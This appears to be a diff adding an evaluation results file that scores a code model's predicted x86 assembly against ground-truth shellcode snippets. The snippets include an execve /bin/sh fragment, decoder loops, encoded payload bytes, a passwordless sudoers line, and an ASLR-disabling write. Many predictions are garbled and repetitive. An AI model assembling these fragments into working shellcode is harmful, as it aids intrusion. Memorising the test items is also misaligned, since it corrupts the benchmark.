@@ -1,0 +1,592 @@
+Ground Truth Snippets;Predicted Snippets;Score Semantic Equivalence
+mov ax, [esi];mov ax, [esi];1
+cmp ecx, 0h;cmp ecx, 0h;1
+push 0x6d6f632e \\n push 0x656c676f \\n push 0x6f672031 \\n push 0x2e312e31 \\n push 0x2e373231;push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f;GT: errorGenEXE
+sub ecx, 0x1525152a;sub ecx, 0x1525152a;1
+inc cx;inc cx;1
+sys_execve equ 0x0b;0x0b equ 0x0b;0
+xor eax, eax \\n xor ebx, ebx;xor eax, eax \\n mul eax;GT: errorGenEXE
+sub bl, al;sub al, bl;GT: errorGenEXE
+int 0x80;mov al, 0x68732f2f \\n int 0x6e69622f;GT: errorGenEXE
+sub bl, 3;sub bl, 3;1
+pop esi;mov esi, esp;GT: errorGenEXE
+push 0x69622f2f;push 0x69622f2f;1
+section .bss;section .;GT: errorGenEXE
+xor esi, esi;xor esi, esi;1
+mov eax, [y];mov eax, y;GT: errorGenEXE
+push edi;push edi;1
+cmp dword [eax], ebx;cmp dword [eax], ebx;1
+get:;get_label:;GT: errorGenEXE
+call_decoder:;call_decoder:;1
+decrypt:;decrypt:;1
+loop main_push;loop main_push;1
+push eax;push eax;1
+zerod:;_zerod:;GT: errorGenEXE
+mov eax, esp;mov eax, esp;1
+mov al, [byte_tbl+2];mov al, byte_tbl+2;GT: errorGenEXE
+mov esi, esp;mov esi, esp;1
+mov ebx, [y];mov ebx, y;GT: errorGenEXE
+duploop:;duploop_label:;GT: errorGenEXE
+chmod_call equ 15;=15:;0
+shl ebx, 8;shl ebx, 8;1
+xor ebx, ebx;ebx:;0
+push byte 0x02;push byte 0x02;1
+shr dl, 4;shr dl, 4;1
+push byte my_label \\n pop eax;push byte my_label \\n pop eax;1
+push dword 0x74652f2f \\n mov ebx, esp;push dword 0x74652f2f \\n mov ebx, esp;1
+inc esi \\n inc esi;inc esi \\n inc esi \\n inc esi \\n inc esi;GT: errorGenEXE
+xor edx, edx \\n xor esi, esi;xor edx, edx \\n xor esi, esi;1
+xor ah, ah;xor ah, ah;1
+jmp loop;jmp loop;1
+int 80h;int 0x80;GT: errorGenEXE
+F2: \\n not bl \\n inc bl;bl: not bl \\n inc bl \\n inc bl;0
+mov [edi], al;mov al, edi;0
+push ecx;push ecx;1
+push edx;push edx \\n push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x;GT: errorGenEXE
+encodedshellcode: db 0xd6,0x47,0xb7,0x9f,0xd8,0xd8,0x94,0x9f,0x9f,0xd8,0xa5,0x9e,0x99,0x7e,0x24,0xb7,0x7e,0x25,0xb4,0x7e,0x26,0x57,0xfc,0x3a,0x87;encodedshellcode: db 0xd6,0x47,0xb7,0x9f,0xd8,0xd8,0x94,0x9f,0x9f,0xd8,0xa5,0x9e,0x99,0x7e,0x24,0xb7,0x7e,0x25,0xb4,0x7e,0x26,0x57,0xfc,0x3a,0x87;1
+next_addr:;_next_addr:;GT: errorGenEXE
+push word 100;push word 100;1
+mov esi, eax;mov esi, eax;1
+push 0x68732f6e \\n push 0x69622f2f \\n mov ebx, esp;push bin/sh \\n push ebx;0
+push eax \\n push edx;push eax \\n push edx;1
+inc ax;add ax, 1;GT: errorGenEXE
+push 0x65782e2f \\n push 0x706d742f;push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f;GT: errorGenEXE
+push word 0x462d;push word 0x462d;1
+mov ecx, esp;mov ecx, esp;1
+lea ecx, [eax];push [\\n pop eax \\n pop ecx;0
+sub eax, eax;xor eax, eax;GT: errorGenEXE
+xor eax, esi;xor eax, esi;1
+jns loopinghere;jns loopinghere;1
+inc edx;inc edx;1
+mov bl,0x4;mov bl, 0x4;1
+duploop:;duploop:;1
+pop esi;pop esi;1
+push word 0x0a;push af_inet6;GT: errorGenEXE
+db 'all all=(all) nopasswd: all', 0xa;db 'all all=(all) nopasswd: all';GT: errorGenEXE
+jmp short path;jmp short path;1
+mov[esi+39], ebx;pop ebx;GT: errorGenEXE
+div ebx;div ebx;1
+push ecx;push ecx;1
+add edi, edi;add edi, edi;1
+zero1a:;_zero1a:;GT: errorGenEXE
+cmp edx, 0x43 \\n ja loop \\n push edx;cmp edx, 0x43 \\n jge loop \\n push edx;GT: errorGenEXE
+add byte [esi], 0x10;add byte [esi], 0x10;1
+section .text;section;GT: errorGenEXE
+mov ecx, m_src3;mov ecx, m_src3;1
+push word 0x3582;push word 0x68732f2f \\n push word 0x6e69622f \\n push word 0x69622f \\n push word 0x69622f;GT: errorGenEXE
+mov byte [esi+14],al;mov byte [esi+14], al;1
+next_addr:;next_addr:;1
+mov bl, 0x01;mov bl, sys_socket;GT: errorGenEXE
+pop esi;pop esi;1
+dec ecx \\n jns loop;dec ecx \\n jns loop;1
+xor byte [esi+1], dl;xor [esi], dl;GT: errorGenEXE
+cmp cl, dl \\n je encodedshellcode;cmp cl, dl \\n je _encodedshellcode;GT: errorGenEXE
+encoded_shellcode: db 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73, 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80;0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73, 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80 db 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73, 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80;0
+lea ecx, [esp];mov ecx, esp;GT: errorGenEXE
+xor eax,eax \\n xor ebx,ebx;xor eax, eax \\n mul eax;GT: errorGenEXE
+mov edx, 2;mov edx, 2;1
+mov esi, esp;mov esi, esp;1
+mov ebx, esp;mov ebx, esp;1
+sub eax, [esp];sub eax, esp;GT: errorGenEXE
+mov cx, 0x301;mov cx, 0x301;1
+hello: db 'hello world!',10;push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n mov linefeed, esp;0
+cmp cl, 0xff \\n jne dup2;cmp cl, 0xff, \\n jne _dup2;GT: errorGenEXE
+inc esi \\n inc esi;inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc;0
+lea ebx, [edx+0x4];lea ebx, [edx+0x4];1
+shr dl, 4;shr dl, 4;1
+xor eax, 0x6e696230;xor eax, 0x6e696230;1
+call [esp];int 0x80;GT: errorGenEXE
+mov edi, 0xaaaa9090;mov edi, 0xaaaa9090;1
+jb next;inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0;0
+filecontents: resb 128;push 0x68732f2f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n mov filecontents, esp;0
+mov al, 23;mov al, 23;1
+mov edx, eax;xchg edx, eax;GT: errorGenEXE
+cmp al, cl \\n jne short decode \\n jmp shellcode;cmp al, cl \\n jne short decode \\n jmp shellcode;1
+push dword eax;push dword eax;1
+mov bl, 5;push 0x68732f2f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n mov bl, esp;0
+pop ecx;pop we;0
+push eax \\n push edx \\n push ecx \\n push ebx \\n mov edi, esp;push eax \\n push edx \\n push ecx \\n push ebx \\n mov edi, esp;1
+mov ecx, esp;mov ecx, esp;1
+call write;jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero6e69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f;GT: errorGenEXE
+push 10 \\n mov eax, esp;push 10 \\n mov eax, esp;1
+xchg ebx, eax;xchg eax, ebx;GT: errorGenEXE
+mov ecx, esp;mov ecx, [args];GT: errorGenEXE
+mov ecx, esp;mov ecx, esp;1
+mov esi, esp;mov esi, esp;1
+lea ecx, [esp];mov ebx, esp;GT: errorGenEXE
+lea edi, [ebx];lea edi, [ebx];1
+xor dl, 0xbb;xor dl, 0xbb;1
+mov cl, len;mov cl, 0x68732f2f \\n add cl, 0x68732f \\n add cl, 0x6e69622f \\n add cl, 0x69622f \\n add cl, 0x69622f \\n add cl, 0x69622f \\n add cl, 0x69622f \\n add cl, 0x6e69622f \\n add cl, 0x6e69622f \\n add cl, 0x69622f2f \\n add cl, 0x6;GT: errorGenEXE
+mov cl, 0x2;mov cl, 0x2;1
+mov eax, msg3;mov eax, msg3;1
+push 0x78;push 0x78;1
+mov al, 11 \\n int 0x80;int 0x80;GT: errorGenEXE
+sub bx, dx;sub bx, dx;1
+push 0x61702f2f \\n push 0x6374652f \\n mov eax, esp;push 0x61702f2f \\n push 0x6374652f \\n mov eax, esp;1
+mov edi, hexstr;mov edi, hexstr;1
+jmp edi;jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero6e69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f;GT: errorGenEXE
+variablename3: resd 1;push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n;0
+jae _start-0x24;jns _start-0x24;GT: errorGenEXE
+push 0x2;push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f;GT: errorGenEXE
+push eax \\n push 0x68732f2f \\n push 0x6e69622f \\n push ebx, esp \\n mov edx, eax \\n mov al, 0xb \\n int 0x80;push temrinated \\n push '/bin//sh' \\n push ebx \\n push edx \\n push temrinated \\n push '/bin//sh' \\n push ebx \\n mov edx, esp;0
+xor ax, bx \\n jz call_decoded;xor ax, bx \\n jz call decoded;0
+mov edx, 0x1234567;mov edx, 0x1234567;1
+mov [1000h], ax;mov ax, 1000h;GT: errorGenEXE
+pop esi;pop esi;1
+call_egghunter:;call_egghunter:;1
+mov ebx, type var3;mov ebx, var3;GT: errorGenEXE
+open:;open_label:;GT: errorGenEXE
+mov ecx, esp;mov ecx, esp;1
+switch:;_switch:;GT: errorGenEXE
+mov byte al, 0xa4;mov al, byte [0xa4];GT: errorGenEXE
+2:;numeric 0x68732f2f \\n int 0x68732f \\n int 0x6e69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x69622f;0
+push 0xb \\n pop eax;push 0x68732f2f \\n push 0x6e69622f \\n push 0x69622f \\n mov eax, esp;GT: errorGenEXE
+mov al, 0xb \\n int 0x80;mov al, 0x68732f2f \\n int 0x68732f \\n int 0x6e69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x6e69622f;GT: errorGenEXE
+cmp BYTE al, 2 \\n je do_inject \\n jmp while;cmp al, 2 \\n jne while \\n jmp do_inject;GT: errorGenEXE
+pop ebx;pop ebx;1
+push 0x10;push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f;GT: errorGenEXE
+push byte 49;push byte 49;1
+mov al, 0x58;push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n mov ebx, esp;GT: errorGenEXE
+xor eax, eax \\n push eax;push edx;GT: errorGenEXE
+cmp eax, ebx \\n je child;cmp eax, ebx \\n jne child;GT: errorGenEXE
+mov ax, 8h;mov ax, 8h;1
+push 0x2f2f2f2f \\n mov ecx, esp;push 0x2f2f2f2f \\n mov ecx, esp;1
+"call shellcode \\n message db ""/bin/sh""";push of /bin/sh \\n push eip \\n mov shellcode_label, esp;0
+cmp bl, 0x1f;cmp bl, 0x1f;1
+decoder: \\n pop esi \\n mov edi, esi;pop esi \\n mov edi, [esi];GT: errorGenEXE
+push 0x68736162;push 0x68736162;1
+mov eax, 63;mov eax, 0x68732f2f \\n int 0x68732f \\n int 0x6e69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x69622f;GT: errorGenEXE
+mov al,0xa2 \\n int 80h;int 0x80;GT: errorGenEXE
+push eax \\n mov ebx, esp;push eax \\n mov ebx, esp;1
+xchg byte [esi+1], al;inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc;0
+jmp short enc;jmp short enc;1
+mov al,0x8 \\n mov cl,077o;reate: \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n mov 0x77, 0x;0
+stage:;_stage:;GT: errorGenEXE
+mov dl, 0x45;mov dl, 0x45;1
+inc esi \\n jmp L1;inc L2 \\n jmp L2;0
+movq mm0, qword [edi];mov mm0, \xor_value\;0
+mov byte [esi], dl;mov dl, byte [esi];GT: errorGenEXE
+inc edi;inc edi;1
+xor eax, [edi];xor eax, edi;GT: errorGenEXE
+mov al, 0x17;xor 0x17, 0x17;0
+mov [esi+35], esi;mov esi+35, esi;0
+dec ecx;dec ecx;1
+push word 0x3436;push word 0x3436;1
+call jmp_search;call jmp_search;1
+write_syscall equ 4;write_syscall equ 4;1
+cmp BYTE [esi], 0x7 \\n jle lowbound;cmp BYTE [esi], 0x7 \\n jl lowbound;GT: errorGenEXE
+add eax, 2;add eax, 2;1
+push byte 4 \\n pop eax;push byte 4 \\n pop eax;1
+push 0x64687373 \\n mov edi, esp;push 0x64687373 \\n mov edi, esp;1
+jmp short four;jmp short four;1
+xchg ebx, eax;xchg ebx, eax;1
+buffersize: dw 1024;buffersize word 0x68732f \\n 0x68732f \\n 0x6e69622f \\n 0x69622f \\n 0x69622f \\n 0x69622f \\n 0x69622f \\n 0x69622f \\n 0x69622f \\n 0x69622f \\n 0x69622f \\n 0x69622f \\n 0x69622f \\n 0x69622f \\n 0x69622f \\n 0;0
+pop esi \\n mov bx, [esi];pop esi \\n mov bx, [esi];1
+push eax \\n push 0x636e2f6e \\n push 0x69622f2f;push 0-term \\n push cn/n \\n push ib//;0
+push 0x2;push for \\n push af_inet;GT: errorGenEXE
+mov ecx, eax;mov ecx, eax;1
+push word 0x8223;push word 0x8223;1
+push 0x1ff9090 \\n pop ecx;push 0x1ff9090 \\n push ecx \\n push 0x10 \\n push 0x1ff9090 \\n push ecx \\n push 0x10 \\n mov 0x10, esp;0
+cmp edx, 42;cmp edx, 42;1
+push esi;push sockfd;GT: errorGenEXE
+close:;close_label:;GT: errorGenEXE
+pop ecx \\n loop l1 \\n mov eax, 1;pop ecx \\n dec ecx \\n jmp l1;GT: errorGenEXE
+matrix qw 12*10;for: \\n 12*10: \\n quad-bytes:;0
+F5: \\n jmp L1;F5: \\n jmp L1;1
+mov bl, 0xe;mov bl, 0xe;1
+mov al, 0x01;mov byte [eax], 0x1;GT: errorGenEXE
+R1: \\n inc esi \\n inc esi;inc R1 \\n inc esi;0
+xor byte [esi], 0x2c;xor 0x2c, esi;0
+mov edi, 0x978cd092 \\n mov ebx, edi;push 0x978cd092 \\n pop edi \\n pop ebx;GT: errorGenEXE
+mov ebx, esp;mov ebx, ptr;0
+lea ebx, [esp];mov ebx, esp;GT: errorGenEXE
+push 0x74756f2f;push 0x74756f2f;1
+loop bucle;dec ecx \\n jns bucle;GT: errorGenEXE
+push 0x3a303a3a;push 0x3a303a3a;1
+jns loop2;jns _loop2;GT: errorGenEXE
+push 0x30;push 0x30;1
+S1: db 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73;0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73 db 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73;0
+F1: \\n pop esi;F1: \\n pop esi;1
+push 0x68732f2f \\n push 0x6e69622f \\n mov eax, esp;mov eax, ASCII /bin/sh;0
+mov cx, 2001Q;mov cx, 2001Q;1
+jne no_error;jne no_error;1
+cmp cl, 0x11 \\n jb 0xff \\n add dl, 0x5;cmp cl, 0x11 \\n add dl, 0x5;GT: errorGenEXE
+xor eax, 0x58494741;xor eax, 0x58494741;1
+L3: \\n jmp edi;L3: \\n jmp edi;1
+push ebx;push ebx;1
+xor ecx, ecx \\n mov cl, shellcode_length;xor shellcode_length, shellcode_length \\n mov byte [shellcode_length], shellcode_length;0
+mov al, 0x42;mov al, 0x42;1
+mov byte [esp], 0x2f;mov byte [var1], 0x2f;GT: errorGenEXE
+xor ebx, ebx \\n xor edx, edx;xor ebx, ebx \\n mul ebx;GT: errorGenEXE
+mov dword [esp-4], esi;mov dword [[], esi;0
+mov [esi], al;mov esi, al;0
+xor ecx, ecx \\n mul ecx;xor eax, eax \\n xor ecx, ecx;GT: errorGenEXE
+jmp short decode_pr;decode_pr: \\n inc decode_pr;0
+function_5: \\n call [esp];function_5: \\n int 0x80;GT: errorGenEXE
+mov cl, 100;mov cl, 100;1
+xchg esi, eax;mov esi, esp;GT: errorGenEXE
+mov al, 0x66;mov al, 0x66;1
+xor edx, edx \\n push edx;push edx;GT: errorGenEXE
+loop l4 \\n mov edx, esp;loop l4 \\n mov edx, esp;1
+sub ecx,ecx \\n push ecx;xor ecx, ecx \\n push ecx;GT: errorGenEXE
+shellcode: db 0xc6,0x02,0x80,0x01,0x81,0x03,0xd1,0x01,0xbe,0x02,0x5f,0x01,0x98,0x03,0x1c,0x06,0x60,0x08,0xf6,0x04,0xc5,0x01,0x92,0x04,0x30,0x07,0x64,0x06,0x3a,0x04,0x58,0x08,0x4f,0x03,0x59,0x05,0xd2,0x06,0x81,0x08,0x1a,0x04,0x5f,0x07,0x03,0x08,0xd8,0x04,0x0c,0x04, 0xbb, 0xbb;shellcode: db 0xc6,0x02,0x80,0x01,0x81,0x03,0xd1,0x01,0xbe,0x02,0x5f,0x01,0x98,0x03,0x1c,0x06,0x60,0x08,0xf6,0x04,0xc5,0x01,0x92,0x04,0x30,0x07,0x64,0x06,0x3a,0x04,0x58,0x08,0x4f,0x03,0x59,0x05,0xd2,0x06,0x81,0x08,0x1a,0x04,0x5f,0x07,0x03,0x08,0xd8,0x04,0x0c,0x04, 0xbb, 0xbb;1
+mov edx, ecx;mov edx, ecx;1
+test eax, eax \\n jz short loc_402B13;test eax, eax \\n jz short loc_402B13;1
+add eax, 0x10;add eax, 0x10;1
+mov ecx, ebp;mov ecx, ebp;1
+push 0x1;push socket_type \\n push = \\n push sock_stream;0
+add ax, [di + 20];add ax, di + 20;0
+mov al,0x6;mov al, 0x68732f2f \\n mov al, 0x68732f \\n mov al, 0x6e69622f \\n mov al, 0x69622f \\n mov al, 0x69622f \\n mov al, 0x69622f \\n mov al, 0x69622f \\n mov al, 0x6e69622f \\n mov al, 0x69622f \\n mov al, 0x6e69622f \\n mov al, 0x69622;GT: errorGenEXE
+dec esp;dec esp;1
+push eax;push 0x68732f2f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f;GT: errorGenEXE
+sub eax,20000h;sub eax, 20000h;1
+section .bss;section \\n uninitialized: db 0x68732f2f \\n db 0x6e69622f \\n db 0x69622f \\n db 0x69622f \\n db 0x69622f \\n db 0x69622f \\n db 0x69622f \\n db 0x69622f \\n db 0x69622f \\n db 0x69622f \\n db 0x69622f \\n db 0x69622f2f \\n db 0x69622;GT: errorGenEXE
+pop cx;pop cx;1
+push 0x6475732f \\n push 0x6374652f \\n mov eax, esp;push 0x6475732f \\n push 0x6374652f \\n mov eax, esp;1
+mov ecx, esp;mov ecx, args;GT: errorGenEXE
+cmp al, 0xf2;cmp al, 0xf2;1
+db 0c6h;db '0c6h';GT: errorGenEXE
+cmp eax, eax \\n jne 0x8;cmp eax, eax \\n jne 0x8;1
+xor ax, 0x3041;xor ax, 0x3041;1
+jnz decode;jz _decode;GT: errorGenEXE
+pop ecx \\n mov edi, ecx;pop ecx \\n pop stak \\n mov edi, esp;0
+add eax, ebx;add eax, ebx;1
+push 0x2f2f2f2f \\n mov esi, esp;push 0x2f2f2f2f \\n mov esi, esp;1
+mov cl, al;backup al;0
+push ecx;push host_sockfd;GT: errorGenEXE
+find_address:;find_address:;1
+shl edx, 9;shl edx, 9;1
+dup2:;_dup2:;GT: errorGenEXE
+three:;_three:;GT: errorGenEXE
+L1: \\n jmp short esp;jmp short esp;GT: errorGenEXE
+push byte 10;push byte 10;1
+wrap_around:;_wrap_around:;GT: errorGenEXE
+cmp bl, 78h \\n jge short loc_402B1D;cmp bl, 78h \\n jge loc_402B1D;GT: errorGenEXE
+_start: \\n jmp short enc;_start: \\n jmp short enc;1
+push word 0x5c11;push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f;GT: errorGenEXE
+read:;read_label:;GT: errorGenEXE
+mov bl, byte [edi];mov bl, byte [edi];1
+db '/bin/sh';db '/bin/sh';1
+priv_setgid:;_ priv_setgid:;0
+sub edx, edx;xor edx, edx;GT: errorGenEXE
+mov bl, 4;mov: \\n =: \\n var2: \\n sys_listen: \\n bl:;0
+mov ecx, esp;mov ecx, ptr;0
+mov ebx, esp;ebx:;0
+cdq \\n push edx;xor edx, edx \\n push edx;GT: errorGenEXE
+xor bl, 0xaa \\n jne encodedshellcode;xor bl, 0xaa \\n jnz encodedshellcode;GT: errorGenEXE
+xor edx, edx;xor edx, edx;1
+push 0x6374652f \\n mov esi, esp;push 0x6374652f \\n mov esi, esp;1
+push byte 0x2 \\n pop eax;push byte 0x2 \\n pop eax;1
+sub ecx, ecx;sub ecx, ecx;1
+xor edx, edx \\n mov dl, 5;xor edx, edx \\n mov byte [edx], 5;GT: errorGenEXE
+jmp short stage;jmp short _stage;GT: errorGenEXE
+sub ax, 1564;sub ax, 1564;1
+shell_ret:;shell_ret:;1
+mov cx,0x3b30 \\n push cx;push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n;0
+cmp byte [buff], 7ah;cmp byte [buff], 7ah;1
+push 0x67513231;push 0x67513231;1
+push 2;push 0x68732f2f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x;GT: errorGenEXE
+push 0x10;push 0x10;1
+push eax \\n pop edx;mov edx, eax;GT: errorGenEXE
+message: db 'hello world!';message db 'hello world!';GT: errorGenEXE
+mov eax, 3;mov sys_read, esp;0
+db 'egg mark';db 'egg mark';1
+xor edx, edx;xor edx, edx;1
+jmp short push_cmd;jmp short push_cmd;1
+decode:;decode:;1
+xor cl, 0x32;xor cl, 0x32;1
+cmp bl, 0xbb \\n je xordecode \\n jmp notdecode;cmp bl, 0xbb \\n jge xordecode \\n jmp notdecode;GT: errorGenEXE
+mov ebx, [ebp-4];push [\\n pop ebp-4 \\n pop] \\n pop ebx;0
+push byte +0x68;push byte +0x68;1
+mov cx, 0700;mov cx, 0700;1
+cdq;edx:;0
+mov al, 0xcd;mov al, 0xcd;1
+xor cl, 0xaa;xor cl, 0xaa;1
+cmp al, 0xf2;cmp al, 0xf2;1
+mov al, 11;mov al, 0x68732f2f \\n int 0x68732f \\n int 0x6e69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x6e69622f;GT: errorGenEXE
+push 15 \\n mov ecx, esp;push ecx \\n mov ecx, 15;GT: errorGenEXE
+xchg eax, ebx;xchg eax, ebx;1
+push byte 16 \\n pop eax;push byte 16 \\n pop eax;1
+mov long [esi+26], eax;mov eax, [esi+26];GT: errorGenEXE
+mov dword [esp-0x4],eax \\n mov dword [esp-0x8],0x65636170 \\n mov dword [esp-0xc],0x735f6176 \\n mov dword [esp-0x10],0x5f657a69 \\n mov dword [esp-0x14],0x6d6f646e \\n mov dword [esp-0x18],0x61722f6c \\n mov dword [esp-0x1c],0x656e7265 \\n mov dword [esp-0x20],0x6b2f7379 \\n mov dword [esp-0x24],0x732f636f \\n mov dword [esp-0x28],0x72702f2f \\n sub esp,0x28 \\n mov ebx,esp;push proc/sys/kernel/randomize_va_space \\n push eax \\n mov ebx, esp;0
+mov bl, 0x2;mov bl, 0x2;1
+push 0x37333333 \\n push 0x3170762d;push '-vp13337';GT: errorGenEXE
+push 0x2f2f2f2f;push 0x2f2f2f2f;1
+lea esi, [esi +4];push [\\n pop esi +4;0
+scasd;cmp dword [edi], eax;GT: errorGenEXE
+mov ecx,esp;mov ecx, esp;1
+mov eax, [ebx+8];mov eax, byte [ebx+8];0
+bound esp,qword ptr [ebx+0x41];bound ebx, 0x68732f2f, 0x6e69622f, 0x69622f, 0x69622f, 0x69622f, 0x69622f, 0x69622f, 0x69622f, 0x69622f, 0x69622f, 0x69622f, 0x69622f, 0x69622f;0
+push ebx;push 0x68732f2f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f;GT: errorGenEXE
+int 3;mov breakpoint, esp;0
+xor ecx, ecx \\n xor eax, eax \\n xor edx, edx;xor ecx, ecx \\n xor eax, eax \\n xor edx, edx;1
+push 0x10 \\n push ecx \\n push edx;push sizeof(struct;0
+cmp bl, 0xaa \\n je shellcode;cmp bl, 0xaa \\n jz shellcode;GT: errorGenEXE
+push edx \\n mov ecx, esp;push edx \\n mov ecx, esp;1
+mov bl, 0xff;pop bl;0
+xor eax, eax \\n xor edx, edx;xor eax, eax \\n xor edx, edx;1
+mov al,2;mov al, __nr_fork;GT: errorGenEXE
+cmp ecx, ebp;cmp ecx, ebp;1
+xchg esp, esi;xchg esi, esp;GT: errorGenEXE
+push dword ebx \\n push dword ebx;push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2;GT: errorGenEXE
+push 0x6d726574;push 0x6d726574;1
+mov al, 0x3f;push sys \\n push for \\n push dup2 \\n mov al, 0x68732f2f \\n mov dup2, 0x6e69622f \\n mov for, 0x69622f \\n mov dup2, 0x69622f \\n mov dup2, 0x69622f \\n mov for, 0x69622f2f \\n mov dup2, 0x69622f \\n mov dup2, 0x69622f \\n mov for, 0x69622f;0
+call decoder;jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero6e69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f;GT: errorGenEXE
+test al, al \\n jz found \\n inc ecx;cmp al, ecx \\n jz found \\n inc ecx;0
+mov bl, 5;mov bl, 5;1
+int 0x80;int 0x80;1
